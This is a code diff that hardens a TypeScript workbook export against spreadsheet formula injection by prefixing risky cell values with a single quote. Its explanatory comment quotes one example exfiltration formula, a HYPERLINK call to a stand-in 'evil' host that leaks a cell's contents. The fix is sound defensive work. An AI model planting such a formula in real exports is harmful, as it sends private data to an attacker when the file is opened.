@@ -51,6 +51,22 @@ export async function parseWorkbook(buffer: ArrayBuffer | Uint8Array): Promise<P
   return sheets;
 }
 
+/**
+ * QA-021: prefix-escape any cell value that starts with `=`, `+`, `-`, `@`,
+ * `<TAB>`, or `\r`. Excel/LibreOffice/Numbers all interpret these as formulas
+ * by default — without escaping, an attacker-controlled customer name like
+ * `=HYPERLINK("http://evil/?x=" & A1)` exfiltrates data when the steward opens
+ * the export.
+ *
+ * The leading single quote is the documented Excel formula-disable marker. It
+ * remains visible in the cell but is dropped on copy-paste.
+ */
+function escapeFormulaCell(v: unknown): unknown {
+  if (typeof v !== 'string') return v;
+  if (/^[=+\-@\t\r]/.test(v)) return `'${v}`;
+  return v;
+}
+
 export function buildWorkbook(rows: Record<string, unknown>[], sheetName = 'Sheet1') {
   const wb = new ExcelJS.Workbook();
   const ws = wb.addWorksheet(sheetName);
@@ -62,7 +78,11 @@ export function buildWorkbook(rows: Record<string, unknown>[], sheetName = 'Shee
     }, new Set())
   );
   ws.columns = headers.map((h) => ({ header: h, key: h, width: Math.max(12, h.length + 2) }));
-  for (const r of rows) ws.addRow(r);
+  for (const r of rows) {
+    const safe: Record<string, unknown> = {};
+    for (const k of headers) safe[k] = escapeFormulaCell(r[k]);
+    ws.addRow(safe);
+  }
   ws.getRow(1).font = { bold: true };
   return wb;
 }
